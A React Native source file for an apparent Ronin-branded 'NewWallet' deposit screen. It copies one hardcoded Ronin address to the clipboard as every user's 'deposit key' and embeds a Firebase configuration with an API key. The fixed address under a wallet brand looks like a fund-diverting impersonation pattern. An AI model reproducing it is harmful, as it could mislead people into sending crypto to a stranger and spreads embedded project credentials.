import React, { useState } from 'react';
import {
  Animated, Keyboard, ScrollView, Alert, Image, StyleSheet, KeyboardAvoidingView, TextInput, ToastAndroid
} from 'react-native';
import { color } from 'react-native-reanimated';
import { initializeApp } from 'firebase/app';
import { getFirestore, setDoc, doc } from 'firebase/firestore';
import * as Clipboard from 'expo-clipboard';
import { Snackbar } from 'react-native-paper';

import {
  View, Text, Button, Colors, Dialog,

  Typography, TextField, ChipsInput
} from 'react-native-ui-lib';

const ronin = require('../assets/images/ronin.png')
const capa = require('../assets/images/capa.png')


const ButtonSpace = 20;

const firebaseConfig = {
  apiKey: "AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8",
  authDomain: "atlas-20a8c.firebaseapp.com",
  projectId: "atlas-20a8c",
  storageBucket: "atlas-20a8c.appspot.com",
  messagingSenderId: "764124638085",
  appId: "1:764124638085:web:942422a53a05f9b58532ec",
  measurementId: "G-6YFE7TEXBL"
}  






function NewWallet({ navigation }) {



  const [copiedText, setCopiedText] = React.useState('');

  const copyToClipboard = () => {
    Clipboard.setString('ronin:423daae8ef3876a7a6373587429b5b852a3c25a1');
    alert('copy deposit key');

  };

  



  state = {};
  toggle = false;
  animatedValue = new Animated.Value(0);

  animate = () => {
    this.toggle = !this.toggle;
    Animated.timing(this.animatedValue, {
      toValue: Number(this.toggle),
      duration: 300,
      useNativeDriver: true
    }).start();
  };

  function renderDivider() {
    return <View height={2} bg-grey60 />;
  }


  return (
    <ScrollView onBlur={Keyboard.dismiss}>
      <KeyboardAvoidingView behavior="position" enabled>

        <View flex center marginT-100 >
          <Image
            style={styles.roninLogo}
            source={ronin}
          />




          <Text center={true} text60 marginB-25 marginT-40>
            Deposit Token

          </Text>




          <View style={{ borderRadius: 7 }} center width={'80%'} height={320} backgroundColor={'#e6e6e6'}>
            <Text style={{ padding: 20 }} text65>Purchase assets on Ronin</Text>
            <Image
              style={styles.tinyLogo}
              source={capa}
            />
            <Text text-70 marginB-20>Deposit funds straight to your Ronin account.</Text>

            <Button onPress={copyToClipboard} backgroundColor={'#1174ea'} label={'copy deposit key'}></Button>
          </View>




        </View>



      </KeyboardAvoidingView>

    </ScrollView>
  );

}

export default NewWallet;




const styles = StyleSheet.create({
  container: {
    paddingTop: 50,
  },

  tinyLogo: {
    width: 200,
    height: 80,
    marginBottom: 70
  },


  roninLogo: {
    width: 120,
    height: 50,
    marginBottom: 5
  },
  logo: {
    width: 66,
    height: 58,
  },
  termos: {
    padding: 10,
  },
  input: {
    width: '80%',
    height: 40,
    borderRadius: 7,
    margin: 12,
    borderWidth: 1,
    padding: 10,
  },
  roundedDialog: {
    backgroundColor: Colors.white,
    borderRadius: 12
  },
});
